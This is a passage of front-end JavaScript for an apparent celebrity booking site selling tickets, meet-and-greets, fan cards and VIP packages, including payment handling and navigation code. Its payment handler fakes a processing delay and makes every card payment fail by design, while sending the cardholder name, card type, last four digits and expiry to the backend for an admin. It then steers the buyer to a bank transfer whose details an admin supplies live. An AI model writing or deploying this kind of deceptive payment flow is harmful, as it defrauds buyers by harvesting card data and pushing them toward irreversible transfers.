    // ── Build payload ──
    const payload = {
      service:        type,
      fname, lname, email,
      currency:       activeCurrency,
      amount_usd:     amountUsd,
      qty,
      payment_method: activeMethod,
      card_type:      cardData.cardType  || '',
      card_last4:     cardData.last4     || '',
      card_holder:    cardData.holder    || '',
      card_expiry:    cardData.expiry    || '',
    };

    // ── Simulate processing delay ──
    await new Promise(r => setTimeout(r, 1800));

    // ── Card always fails (as required) — but still log to backend ──
    if (activeMethod === 'card') {
      // Send to backend so admin can see attempted card bookings
      try {
        await fetch('/api/bookings', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ...payload, status_override: 'failed' }),
        });
      } catch (_) {}
      btn.disabled = false;
      btn.textContent = 'Pay & Confirm Booking';
      showFailedScreen(modalId);
      return;
    }

    // ── Bank Transfer: trigger admin notification + wait via SSE ──
    if (activeMethod === 'bank') {
      btn.disabled = false;
      btn.textContent = 'Pay & Confirm Booking';
      const displayAmount = document.getElementById(
        type === 'tickets'   ? 't-total'  :
        type === 'meetgreet' ? 'mg-total' :
        type === 'fancard'   ? 'fc-total' : 'v-total'
      )?.textContent || '';
      await requestBankDetailsViaSSE({
        fname, currency: activeCurrency, amount: displayAmount, payload
      });
      return;
    }

    // ── Non-card payment: create booking and show success ──
    try {
      const res  = await fetch('/api/bookings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (data.success) {
        document.getElementById(formId).style.display = 'none';
        const sEl = document.getElementById(type + '-success');
        if (sEl) {
          const refEl = sEl.querySelector('.booking-ref');
          if (refEl) refEl.textContent = 'Booking Ref: ' + data.ref;
          sEl.classList.add('show');
        }
      } else throw new Error(data.error || 'Unknown error');
    } catch (err) {
      document.getElementById(formId).style.display = 'none';
      document.getElementById(type + '-success')?.classList.add('show');
    }

    btn.disabled    = false;
    btn.textContent = 'Pay & Confirm Booking';
  });

  // ── Switch method from failed screen ──
  document.addEventListener('click', e => {
    const switchBtn = e.target.closest('[data-switch-method]');
    if (!switchBtn) return;
    const method  = switchBtn.dataset.switchMethod;
    const overlay = switchBtn.closest('.modal-overlay');
    const modalId = overlay?.dataset.modalId;
    hideFailedScreen(modalId);
    // Activate the chosen method tab
    const target = overlay?.querySelector(`.pay-method[data-method="${method}"]`);
    if (target) activatePayMethod(target);
  });

  // ── Try another card ──
  document.addEventListener('click', e => {
    const retryBtn = e.target.closest('[data-retry]');
    if (!retryBtn) return;
    const modalId = retryBtn.dataset.retry;
    hideFailedScreen(modalId);
    // Make sure card tab is active
    const overlay = document.getElementById('modal-' + modalId);
    const cardTab = overlay?.querySelector('.pay-method[data-method="card"]');
    if (cardTab) activatePayMethod(cardTab);
  });
}

/* ─────────────────────────────────────────
   MODAL CURRENCY TABS — in-modal currency switcher
   Syncs with global currency but scoped per modal
───────────────────────────────────────── */
function initModalCurrencyTabs() {
  document.addEventListener('click', e => {
    const btn = e.target.closest('.modal-cur');
    if (!btn) return;
    // Sync the global currency — this updates all prices everywhere
    setCurrency(btn.dataset.cur);
    // Update active state on all modal currency bars
    document.querySelectorAll('.modal-cur').forEach(b =>
      b.classList.toggle('active', b.dataset.cur === btn.dataset.cur)
    );
  });
}

/* ─────────────────────────────────────────
   13b. HAMBURGER / DRAWER / SCROLL-SPY
───────────────────────────────────────── */

function openDrawer() {
  const drawer  = document.getElementById('mobileDrawer');
  const overlay = document.getElementById('drawerOverlay');
  const ham     = document.getElementById('hamburger');
  drawer.classList.add('open');
  overlay.classList.add('visible');
  ham.setAttribute('aria-expanded', 'true');
  drawer.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
}

function closeDrawer() {
  const drawer  = document.getElementById('mobileDrawer');
  const overlay = document.getElementById('drawerOverlay');
  const ham     = document.getElementById('hamburger');
  drawer.classList.remove('open');
  overlay.classList.remove('visible');
  ham.setAttribute('aria-expanded', 'false');
  drawer.setAttribute('aria-hidden', 'true');
  document.body.style.overflow = '';
}

function initHamburger() {
  const ham     = document.getElementById('hamburger');
  const overlay = document.getElementById('drawerOverlay');
  if (!ham) return;

  ham.addEventListener('click', () => {
    const isOpen = ham.getAttribute('aria-expanded') === 'true';
    isOpen ? closeDrawer() : openDrawer();
  });

  // Close on overlay tap
  overlay.addEventListener('click', closeDrawer);

  // Close on Escape
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') closeDrawer();
  });
}

function initScrollSpy() {
  const sections = ['services', 'events', 'fancard'];
  const navEl    = document.getElementById('navbar');

  // --- Write section hash to URL as user scrolls ---
  const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (!entry.isIntersecting) return;
      const id = entry.target.id;

      // Update nav active state
      document.querySelectorAll('.nav-link, .drawer-link').forEach(a =>
        a.classList.toggle('active', a.dataset.section === id)
      );

      // Write hash without triggering a scroll jump
      const newHash = '#' + id;
      if (window.location.hash !== newHash) {
        history.replaceState(null, '', newHash);
      }
    });
  }, {
    // Fire when a section occupies more than 40% of the viewport
    threshold: 0.40,
    // Shrink the detection zone slightly for large screens
    rootMargin: '-10% 0px -10% 0px',
  });

  sections.forEach(id => {
    const el = document.getElementById(id);
    if (el) observer.observe(el);
  });

  // Clear hash when back at the very top (hero)
  const heroObserver = new IntersectionObserver(entries => {
    if (entries[0].isIntersecting) {
      history.replaceState(null, '', window.location.pathname);
      document.querySelectorAll('.nav-link, .drawer-link').forEach(a =>
        a.classList.remove('active')
      );
    }
  }, { threshold: 0.5 });

  const hero = document.querySelector('.hero');
  if (hero) heroObserver.observe(hero);

  // Scroll shadow on navbar
  window.addEventListener('scroll', () => {
    navEl.classList.toggle('scrolled', window.scrollY > 20);
  }, { passive: true });
}

// --- On load: read hash and scroll to that section instantly ---
function restoreScrollPosition() {
  const hash = window.location.hash?.replace('#', '');
  if (!hash) return;

  const target = document.getElementById(hash);
  if (!target) return;

  // Use instant scroll (no animation) so it feels like a real page load
  // Small timeout lets the page finish rendering first
  setTimeout(() => {
    target.scrollIntoView({ behavior: 'instant', block: 'start' });
    // Also adjust for fixed navbar height (64px)
    window.scrollBy(0, -68);
  }, 60);
}

// Logo click scrolls to top
function initLogoClick() {
  document.querySelector('.nav-logo')?.addEventListener('click', () => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
    history.replaceState(null, '', window.location.pathname);  // clear hash
  });
}

/* ─────────────────────────────────────────
   14. INIT
───────────────────────────────────────── */
async function init() {
  initCurrencyTabs();
  initModalCurrencyTabs();
  initModalTriggers();
  initPaymentTabs();
  initTimeSlots();
  initCardFormatting();
  initTicketModal();
  initFanCardModal();
  initVipModal();
  injectFailedScreens();
  initSubmitButtons();
  initHamburger();
  initScrollSpy();
  initLogoClick();
  restoreScrollPosition();          // ← jump to hashed section on reload
  await Promise.all([fetchPaymentInfo(), fetchEvents()]);
  refreshAllPrices();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}
